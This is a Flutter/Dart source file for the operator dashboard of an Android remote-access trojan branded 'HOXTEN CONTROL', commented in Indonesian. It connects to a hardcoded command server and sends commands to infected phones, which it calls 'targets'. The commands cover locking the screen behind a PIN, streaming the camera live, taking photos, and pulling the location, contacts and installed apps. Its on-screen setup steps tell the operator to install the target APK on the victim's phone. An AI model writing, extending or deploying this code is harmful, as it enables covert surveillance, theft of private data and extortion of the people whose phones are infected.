import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart'; // IMPORT VIDEO PLAYER

const String SERVER_BASE_URL = 'http://203.175.125.202:3018';

class AdminPanel extends StatefulWidget {
  final String sessionKey;
  const AdminPanel({super.key, required this.sessionKey});

  @override
  State<AdminPanel> createState() => _AdminPanelState();
}

class _AdminPanelState extends State<AdminPanel> {
  List<dynamic> targets = [];
  String? selectedTargetId;
  late IO.Socket socket;

  String deviceId = "";
  String permanentAdminId = "";
  bool isLoadingDeviceId = true;

  // VIDEO PLAYER VARIABLES
  late VideoPlayerController _videoController;
  bool _isVideoInitialized = false;

  final TextEditingController lockPinCtrl = TextEditingController(text: "123");
  final TextEditingController lockMsgCtrl = TextEditingController(text: "🔒 SYSTEM LOCKED 🔒\nEnter PIN to unlock");
  final TextEditingController chatMsgCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    _initVideo(); // Inisialisasi Video
    loadPermanentAdminId();
    fetchTargets();
    initSocket();
  }

  // FUNGSI INISIALISASI VIDEO
  void _initVideo() {
    _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
      ..initialize().then((_) {
        setState(() {
          _isVideoInitialized = true;
        });
        _videoController.setLooping(true);
        _videoController.setVolume(0.0); // Set volume 0 agar tidak berisik
        _videoController.play();
      }).catchError((e) {
        print('Error loading video: $e');
      });
  }

  Future<void> loadPermanentAdminId() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    String? savedPermanentId = prefs.getString('permanent_admin_id');
    
    if (savedPermanentId != null) {
      setState(() {
        permanentAdminId = savedPermanentId;
        deviceId = savedPermanentId.substring(0, 15).toUpperCase();
        isLoadingDeviceId = false;
      });
      print('[!] Loaded Admin ID: $permanentAdminId');
    } else {
      setState(() {
        permanentAdminId = widget.sessionKey;
        deviceId = widget.sessionKey.substring(0, 15).toUpperCase();
        isLoadingDeviceId = false;
      });
      print('[!] WARNING: No admin ID found, using session key');
    }
  }

  void initSocket() {
    socket = IO.io(SERVER_BASE_URL, {
      'transports': ['websocket'],
      'query': {'type': 'admin'}
    });
    socket.connect();
    socket.onConnect((_) => print('Admin socket connected'));
    socket.on('response_update', (data) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Response: ${data['cmd']}'), duration: const Duration(seconds: 2))
      );
    });
    socket.on('new_target', (data) {
      fetchTargets();
    });
  }

  Future<void> fetchTargets() async {
    final res = await http.get(
      Uri.parse('$SERVER_BASE_URL/api/list-targets-by-admin?admin_id=$permanentAdminId')
    );
    if (res.statusCode == 200) {
      setState(() => targets = jsonDecode(res.body));
    } else {
      final res2 = await http.get(Uri.parse('$SERVER_BASE_URL/api/list-targets'));
      if (res2.statusCode == 200) {
        final allTargets = jsonDecode(res2.body);
        final myTargets = allTargets.where((t) => t['admin_owner'] == permanentAdminId).toList();
        setState(() => targets = myTargets);
      }
    }
  }

  void copyDeviceIdToClipboard() {
    Clipboard.setData(ClipboardData(text: deviceId));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('✅ ID Pairing disalin!'), duration: Duration(seconds: 1))
    );
  }

  void sendCommand(String command, {String extra = ''}) {
    if (selectedTargetId == null) {
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Pilih target dulu!')));
      return;
    }
    socket.emit('send_command', {'targetId': selectedTargetId, 'command': command, 'extra': extra});
    http.post(Uri.parse('$SERVER_BASE_URL/api/send-command'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'id': selectedTargetId, 'command': command, 'extra': extra})
    );
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('✅ $command -> $selectedTargetId')));
  }

  int getOnlineCount() {
    return targets.where((t) => t['online'] == true).length;
  }

  // STYLE TEKS GLOW AGAR TEBACA DI ATAS VIDEO
  TextStyle get glowingWhiteText => const TextStyle(
    color: Colors.white,
    shadows: [
      Shadow(blurRadius: 8, color: Colors.black, offset: Offset(1, 1)),
      Shadow(blurRadius: 4, color: Colors.black, offset: Offset(-1, -1)),
    ],
  );

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black, // Fallback warna hitam saat video loading
      appBar: _buildAppBar(),
      body: Stack(
        children: [
          // 1. BACKGROUND VIDEO
          Positioned.fill(
            child: _isVideoInitialized
                ? FittedBox(
                    fit: BoxFit.cover,
                    child: SizedBox(
                      width: _videoController.value.size.width,
                      height: _videoController.value.size.height,
                      child: VideoPlayer(_videoController),
                    ),
                  )
                : Container(color: const Color(0xFF0A0E27)), // Warna sementara sebelum video loading
          ),
          
          // 2. DARK OVERLAY (Agar teks kontras & tidak terganggu warna video)
          Positioned.fill(
            child: Container(
              color: Colors.black.withOpacity(0.6), // Atur opacity 0.5 - 0.8 sesuai kebutuhan
            ),
          ),

          // 3. ISI KONTEN UI
          SingleChildScrollView(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                _buildOnlineStatusCard(),
                const SizedBox(height: 16),
                _buildDeviceDashboardCard(),
                const SizedBox(height: 16),
                _buildIdPairingCard(),
                const SizedBox(height: 16),
                _buildConnectedDevicesSection(),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildOnlineStatusCard() {
    int onlineCount = getOnlineCount();
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: onlineCount > 0 ? Colors.green.shade900.withOpacity(0.8) : Colors.grey.shade800.withOpacity(0.8),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: onlineCount > 0 ? Colors.green.shade400.withOpacity(0.5) : Colors.grey.withOpacity(0.3)),
      ),
      child: Row(
        children: [
          Container(
            width: 12,
            height: 12,
            decoration: BoxDecoration(
              color: onlineCount > 0 ? Colors.green.shade400 : Colors.grey.shade400,
              shape: BoxShape.circle,
            ),
          ),
          const SizedBox(width: 12),
          Text(
            onlineCount > 0 ? "ONLINE" : "OFFLINE",
            style: glowingWhiteText.copyWith(
              fontWeight: FontWeight.bold,
              fontSize: 16,
              letterSpacing: 1,
            ),
          ),
          const Spacer(),
          Text(
            "$onlineCount Device Terhubung",
            style: glowingWhiteText.copyWith(color: Colors.white70, fontSize: 12),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceDashboardCard() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: const Color(0xFF1A1F3F).withOpacity(0.7),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.15)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.dashboard, color: Color(0xFF43A5FE), size: 24),
              const SizedBox(width: 12),
              Text(
                "DEVICE DASHBOARD",
                style: glowingWhiteText.copyWith(
                  fontWeight: FontWeight.bold,
                  fontSize: 16,
                  letterSpacing: 1,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                decoration: BoxDecoration(
                  color: const Color(0xFF43A5FE).withOpacity(0.2),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Text(
                  "@${permanentAdminId.substring(0, 6)}",
                  style: const TextStyle(color: Color(0xFF43A5FE), fontSize: 12),
                ),
              ),
            ],
          ),
          const SizedBox(height: 20),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              _buildStatItem(Icons.link, "TOTAL", "${targets.length}"),
              _buildStatItem(Icons.copy, "SALIN", "ID"),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildStatItem(IconData icon, String label, String value) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.4),
        borderRadius: BorderRadius.circular(12),
      ),
      child: Column(
        children: [
          Icon(icon, color: Colors.white70, size: 20),
          const SizedBox(height: 4),
          Text(
            label,
            style: const TextStyle(color: Colors.white54, fontSize: 11),
          ),
          Text(
            value,
            style: glowingWhiteText.copyWith(
              fontWeight: FontWeight.bold,
              fontSize: 20,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildIdPairingCard() {
    return GestureDetector(
      onTap: copyDeviceIdToClipboard,
      child: Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [const Color(0xFF1D4ED8).withOpacity(0.9), const Color(0xFF3B82F6).withOpacity(0.9)],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "ID PAIRING (bagikan ke target)",
              style: TextStyle(color: Colors.white70, fontSize: 12),
            ),
            const SizedBox(height: 12),
            Row(
              children: [
                Expanded(
                  child: Text(
                    isLoadingDeviceId ? "Loading..." : deviceId,
                    style: const TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontSize: 20,
                      letterSpacing: 2,
                      fontFamily: 'monospace',
                    ),
                  ),
                ),
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Icon(Icons.copy, color: Colors.white, size: 20),
                ),
              ],
            ),
            const SizedBox(height: 12),
            const Text("Tap untuk menyalin ID", style: TextStyle(color: Colors.white60)),
          ],
        ),
      ),
    );
  }

  Widget _buildConnectedDevicesSection() {
    return Container(
      decoration: BoxDecoration(
        color: const Color(0xFF1A1F3F).withOpacity(0.7),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.15)),
      ),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: const BoxDecoration(border: Border(bottom: BorderSide(color: Colors.white10))),
            child: Row(
              children: [
                const Icon(Icons.devices, color: Color(0xFF43A5FE)),
                const SizedBox(width: 12),
                Text("CONNECTED DEVICES", style: glowingWhiteText.copyWith(fontWeight: FontWeight.bold)),
                const Spacer(),
                Text("${targets.length} Total", style: const TextStyle(color: Colors.white54)),
              ],
            ),
          ),
          targets.isEmpty
              ? _buildEmptyDevices()
              : ListView.builder(
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  itemCount: targets.length,
                  itemBuilder: (context, index) {
                    final device = targets[index];
                    final isOnline = device['online'] == true;
                    return _buildDeviceTile(device, isOnline);
                  },
                ),
          Container(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text("Cara hubungan device:", style: glowingWhiteText.copyWith(color: Colors.white70, fontSize: 13)),
                const SizedBox(height: 8),
                _buildStepText("1. install APK target di HP korban"),
                _buildStepText("2. Buka APK → masukkan ID Pairing di atas"),
                _buildStepText("3. Device otomatis muncul di sini"),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStepText(String text) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 4),
      child: Text(text, style: glowingWhiteText.copyWith(fontSize: 12, color: Colors.white60)),
    );
  }

  Widget _buildEmptyDevices() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 40),
      child: Column(
        children: [
          Icon(Icons.mobile_off, color: Colors.white.withOpacity(0.3), size: 48),
          const SizedBox(height: 8),
          Text("NO DEVICES", style: glowingWhiteText.copyWith(color: Colors.white54)),
          Text("Belum ada device terhubung", style: glowingWhiteText.copyWith(color: Colors.white38, fontSize: 12)),
        ],
      ),
    );
  }

  Widget _buildDeviceTile(Map<String, dynamic> device, bool isOnline) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: isOnline ? Colors.green.withOpacity(0.15) : Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: isOnline ? Colors.green.withOpacity(0.4) : Colors.white.withOpacity(0.1)),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: isOnline ? Colors.green.withOpacity(0.2) : Colors.white.withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(Icons.phone_android, color: isOnline ? Colors.green.shade400 : Colors.white54),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(device['model']?.toString() ?? 'Unknown Device', style: glowingWhiteText),
                Row(
                  children: [
                    Container(width: 6, height: 6, decoration: BoxDecoration(color: isOnline ? Colors.green : Colors.grey, shape: BoxShape.circle)),
                    const SizedBox(width: 6),
                    Text(isOnline ? "Online" : "Offline", style: TextStyle(color: isOnline ? Colors.green : Colors.white54)),
                  ],
                ),
              ],
            ),
          ),
          if (isOnline)
            GestureDetector(
              onTap: () {
                selectedTargetId = device['id']?.toString();
                _showCommandPanel(device);
              },
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(color: const Color(0xFF43A5FE).withOpacity(0.2), borderRadius: BorderRadius.circular(20)),
                child: const Text("CONTROL", style: TextStyle(color: Color(0xFF43A5FE), fontWeight: FontWeight.bold)),
              ),
            ),
        ],
      ),
    );
  }

  void _showCommandPanel(Map<String, dynamic> device) {
    selectedTargetId = device['id']?.toString();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.8,
        decoration: const BoxDecoration(color: Color(0xFF0A0E27), borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              child: Row(
                children: [
                  Container(
                    width: 40,
                    height: 40,
                    decoration: BoxDecoration(color: Colors.green.withOpacity(0.2), borderRadius: BorderRadius.circular(12)),
                    child: const Icon(Icons.phone_android, color: Colors.green),
                  ),
                  const SizedBox(width: 12),
                  Expanded(child: Text(device['model']?.toString() ?? 'Unknown Device', style: const TextStyle(color: Colors.white))),
                  IconButton(onPressed: () => Navigator.pop(context), icon: const Icon(Icons.close, color: Colors.white)),
                ],
              ),
            ),
            Expanded(
              child: SingleChildScrollView(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: _buildCommandGridContent(),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  List<Widget> _buildCommandGridContent() {
    final categories = [
      _CommandCategory('🔒 LOCK', Icons.lock_outline, [
        _CommandItem('HARD LOCK', () => sendCommand('hard_lock', extra: '${lockMsgCtrl.text}|${lockPinCtrl.text}'), Icons.lock, Colors.red),
        _CommandItem('UNLOCK', () => sendCommand('unlock'), Icons.lock_open, Colors.green),
        _CommandItem('CHAT', () => sendCommand('chat_to_target', extra: chatMsgCtrl.text), Icons.chat, Colors.blue),
      ]),
      _CommandCategory('📷 CAMERA', Icons.camera_alt, [
        _CommandItem('LIVE CAM', () => sendCommand('start_live_camera'), Icons.videocam, Colors.blue),
        _CommandItem('STOP LIVE', () => sendCommand('stop_live_camera'), Icons.stop, Colors.orange),
        _CommandItem('PHOTO', () => sendCommand('take_photo'), Icons.camera, Colors.teal),
      ]),
      _CommandCategory('📍 DATA', Icons.data_usage, [
        _CommandItem('LOCATION', () => sendCommand('get_location'), Icons.location_on, Colors.teal),
        _CommandItem('CONTACTS', () => sendCommand('get_contacts'), Icons.contacts, Colors.indigo),
        _CommandItem('APPS', () => sendCommand('get_apps'), Icons.apps, Colors.purple),
      ]),
      _CommandCategory('🎬 MEDIA', Icons.audiotrack, [
        _CommandItem('PLAY MP3', () => sendCommand('play_audio'), Icons.play_arrow, Colors.deepOrange),
        _CommandItem('STOP MP3', () => sendCommand('stop_audio'), Icons.stop, Colors.grey),
      ]),
      _CommandCategory('⚙️ SYSTEM', Icons.settings, [
        _CommandItem('FLASH ON', () => sendCommand('flash_strobe'), Icons.flash_on, Colors.amber),
        _CommandItem('FLASH OFF', () => sendCommand('stop_strobe'), Icons.flash_off, Colors.grey),
        _CommandItem('VIBRATE', () => sendCommand('vibrate_device'), Icons.vibration, Colors.purple),
      ]),
    ];

    List<Widget> widgets = [];
    for (var cat in categories) {
      widgets.add(_buildCategoryCard(cat));
      widgets.add(const SizedBox(height: 12));
    }
    return widgets;
  }

  Widget _buildCategoryCard(_CommandCategory cat) {
    return Container(
      decoration: BoxDecoration(color: const Color(0xFF1A1F3F).withOpacity(0.9), borderRadius: BorderRadius.circular(16)),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            child: Row(children: [Icon(cat.icon, color: const Color(0xFF43A5FE)), const SizedBox(width: 8), Text(cat.title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold))]),
          ),
          Padding(padding: const EdgeInsets.all(12), child: Wrap(spacing: 8, runSpacing: 8, children: cat.items.map((item) => _buildCommandButton(item)).toList())),
        ],
      ),
    );
  }

  Widget _buildCommandButton(_CommandItem item) {
    return ElevatedButton(
      onPressed: item.onPressed,
      style: ElevatedButton.styleFrom(
        backgroundColor: const Color(0xFF0A0E27),
        foregroundColor: item.color,
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        side: BorderSide(color: item.color.withOpacity(0.3)),
      ),
      child: Row(mainAxisSize: MainAxisSize.min, children: [Icon(item.icon, size: 14), const SizedBox(width: 4), Text(item.label)]),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      title: const Text('HOXTEN CONTROL', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, shadows: [Shadow(blurRadius: 10, color: Colors.black)])),
      backgroundColor: Colors.black.withOpacity(0.5), // AppBar sedikit transparan agar serasi dengan video
      actions: [IconButton(onPressed: fetchTargets, icon: const Icon(Icons.refresh, color: Colors.white54))],
    );
  }

  @override
  void dispose() {
    _videoController.dispose(); // Jangan lupa dispose video controller agar tidak memory leak
    socket.disconnect();
    super.dispose();
  }
}

class _CommandCategory {
  final String title;
  final IconData icon;
  final List<_CommandItem> items;
  _CommandCategory(this.title, this.icon, this.items);
}

class _CommandItem {
  final String label;
  final VoidCallback onPressed;
  final IconData icon;
  final Color color;
  _CommandItem(this.label, this.onPressed, this.icon, this.color);
}